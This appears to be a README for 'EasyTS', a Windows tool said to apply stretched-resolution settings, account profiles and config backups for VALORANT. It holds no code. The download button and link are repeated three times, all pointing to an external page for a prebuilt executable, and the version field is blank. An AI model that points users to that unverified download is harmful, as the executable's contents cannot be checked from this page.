# EasyTS v - Game Script Utility 2026

> A Windows helper for VALORANT True Stretch and stretched resolution setup. EasyTS is built to simplify config updates, account management, and resolution-related tweaks without asking you to edit files manually.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/davisandrew82/easyts-windows-game-script?style=flat-square)](https://github.com/davisandrew82/easyts-windows-game-script)

---

<p align="center">
  <a href="https://davisandrew82.github.io/easyts-windows-game-script/">
    <img src="https://img.shields.io/badge/Download-EasyTS%20Script-brightgreen?style=for-the-badge" alt="Download EasyTS Script">
  </a>
</p>

> **[Download Latest Build](https://davisandrew82.github.io/easyts-windows-game-script/)**

---

[Download Latest Build](https://davisandrew82.github.io/easyts-windows-game-script/)

---

## What EasyTS Does

EasyTS is a Windows utility centered on stretched-resolution configuration for VALORANT. It helps apply True Stretch settings for Riot Games titles by updating the game config files and the related Windows display options. Rather than changing values by hand, the app walks you through the steps needed to adjust resolution behavior and keep the stretched presentation in place.

It also includes features for managing several accounts, saving and restoring config backups, and checking whether VALORANT is open before making changes. The tool can set the relevant config to read-only, look for newer builds when it starts, and guide you through the WebView2 requirement so the app can open and function correctly.

---

## Script Features

- Applies VALORANT True Stretch resolution settings
- Supports custom stretched resolutions and preset choices
- Works with multiple saved accounts for quicker switching
- Creates automatic config backups and supports one-click restore
- Checks whether VALORANT is running before applying changes
- Offers an optional read-only lock for the game config
- Includes a WebView2 requirement check with install guidance
- Runs an update check at startup
- Provides a registry-based fix for black bars scaling behavior

---

## Setup

1. Download the latest build from the link above.
2. Extract the files into a folder on your Windows PC.
3. Launch the application and complete the WebView2 prompt if it appears.
4. Open VALORANT-related settings from the app and choose your desired resolution or preset.
5. Save your selection, then apply the config changes when prompted.

If you use multiple accounts, keep each account profile saved inside the tool so you can restore the preferred resolution setup quickly.

---

## Options

| Setting | Purpose |
| --- | --- |
| Resolution preset | Choose a predefined stretched resolution |
| Custom resolution | Enter a manual width and height |
| Account profile | Save settings per VALORANT account |
| Backup before apply | Store a copy of the current config |
| Restore config | Revert to the last saved backup |
| Read-only lock | Prevent the config from being edited afterward |
| Running check | Block changes while VALORANT is open |
| Startup update check | Look for newer builds when the app starts |

Example usage flow:

- Pick a preset or custom stretched resolution
- Save the account profile if needed
- Apply the config
- Enable read-only lock if you want that behavior

---

## Compatibility

EasyTS is designed for Windows and for VALORANT installs that rely on Riot Games configuration files. It follows the game's settings workflow instead of changing gameplay itself.

Known limitations:

- It depends on access to the local VALORANT config files
- WebView2 must be available for the app to load properly
- Some actions may be blocked while the game is running
- Registry-based scaling changes depend on your Windows display setup

---

## FAQ

### How do I install it?
Download the latest build, extract it, and run the app on Windows. If WebView2 is missing, follow the guided install prompt.

### Does it edit the config manually?
No manual editing is needed from the user side. EasyTS handles the resolution-related config changes through its interface.

### Can I use it with more than one account?
Yes. The tool includes saved account handling so you can keep separate profiles.

### What if I want to go back to my previous settings?
Use the backup and restore option to return to the last saved config state.

### Will it work if VALORANT is open?
Some actions require the game to be closed. EasyTS checks for the running state before applying changes.

### Can I customize the stretched resolution?
Yes. You can use built-in presets or enter a custom resolution value.

### Where are the settings stored?
The app works with local VALORANT config data and saved account information inside the tool's own storage.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
